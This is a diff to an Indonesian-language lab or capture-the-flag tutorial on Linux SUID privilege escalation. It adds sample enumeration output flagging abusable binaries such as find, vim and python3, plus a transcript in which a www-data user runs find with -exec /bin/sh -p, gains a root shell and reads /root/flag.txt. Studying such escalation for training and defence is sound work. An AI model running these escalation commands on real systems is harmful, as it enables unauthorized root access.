@@ -29,14 +29,25 @@ ls -la /usr/bin/find
 #         ^ bit "s" menandakan SUID (berjalan sebagai root)
 ```
 
-Contoh output enumerasi:
+Tampilan **aman** (binary SUID wajar, tidak bisa diabuse):
 
 ```text
-/usr/bin/passwd
-/usr/bin/sudo
-/usr/bin/find
-/usr/bin/vim
-/usr/bin/python3
+/usr/bin/passwd          ← wajar, passwd memang butuh SUID
+/usr/bin/sudo            ← wajar, sudo memang butuh SUID
+/usr/bin/mount           ← wajar, mount butuh privilege
+/usr/bin/su              ← wajar, su memang butuh SUID
+```
+
+Tampilan **rentan** (ada binary SUID yang bisa spawn shell):
+
+```text
+www-data@jobportal:~$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/passwd          ← wajar, passwd memang butuh SUID
+/usr/bin/sudo            ← wajar, sudo memang butuh SUID
+/usr/bin/mount           ← wajar, mount butuh privilege
+/usr/bin/find            ← RENTAN! find bisa -exec shell
+/usr/bin/vim             ← RENTAN! vim bisa shell escape
+/usr/bin/python3.11      ← RENTAN! interpreter bisa setuid(0)
 ```
 
 ---
@@ -73,6 +84,26 @@ vim -c ':!/bin/sh -p'
 | `vim` | `:!/bin/sh -p` | Shell escape command-mode |
 
 > **Catatan Privilege Drop:** Shell `/bin/sh` (dash) sering **menurunkan privilege** secara otomatis saat euid ≠ ruid. Solusinya gunakan flag `-p` (privilege preserve) atau binary yang melakukan `execve` langsung seperti `env` dan `find`.
+
+---
+
+## Langkah 3: Contoh Tampilan Eksploitasi (Root Shell)
+
+```text
+www-data@jobportal:~$ ls -la /usr/bin/find
+-rwsr-xr-x 1 root root 32016 Feb  8  2024 /usr/bin/find
+   ^ bit "s" = SUID, dimiliki root → binary ini berjalan sebagai root
+
+www-data@jobportal:~$ find . -name "x" -exec /bin/sh -p \;
+$ id
+uid=33(www-data) euid=0(root) gid=33(www-data) groups=33(www-data)
+$ whoami
+root
+$ cat /root/flag.txt
+FLAG{suid_binary_leads_to_root}
+```
+
+> **Capture:** Eksploitasi berhasil — `euid=0(root)` muncul karena flag `-p` mempertahankan effective UID dari SUID. Shell aktif sebagai root dan flag di `/root/flag.txt` berhasil dibaca.
 
 ---
 
